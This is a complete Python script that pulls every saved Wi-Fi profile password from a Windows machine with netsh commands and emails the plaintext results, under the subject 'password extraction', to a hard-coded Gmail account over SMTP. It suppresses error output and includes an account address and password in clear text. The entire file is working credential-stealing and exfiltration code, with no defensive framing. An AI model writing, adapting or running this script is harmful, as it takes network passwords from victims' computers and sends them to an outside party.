#!/usr/bin/env python
import subprocess, smtplib, re,os

def send_mail(email,password,message):
	server= smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email,password)
	print("login successfull")
	server.sendmail(email, email, message)
	server.quit()

def find_avail_networks():
	cmd="netsh wlan show profiles"
	DEVNULL=open(os.devnull, 'wb')
	result= subprocess.check_output(cmd, shell=True, stderr=DEVNULL, stdin=DEVNULL)
	extract= re.findall("(?:Profile\s*:\s)(.*)", result)
	return extract

def get_pass(extract):
	mess=""
	DEVNULL=open(os.devnull, 'wb')
	for ext in extract:
		command="netsh wlan show profile \""+ext.rstrip("\r")+"\" key=clear"
		mess=mess+ subprocess.check_output(command , shell=True, stderr=DEVNULL, stdin=DEVNULL)
	return mess

extract=find_avail_networks()
mess=get_pass(extract)
Adding_subject= 'Subject: {}\n\n{}'.format("password extraction", mess)
send_mail("srivastavanuj21@gmail.com","aeiou1234",Adding_subject)
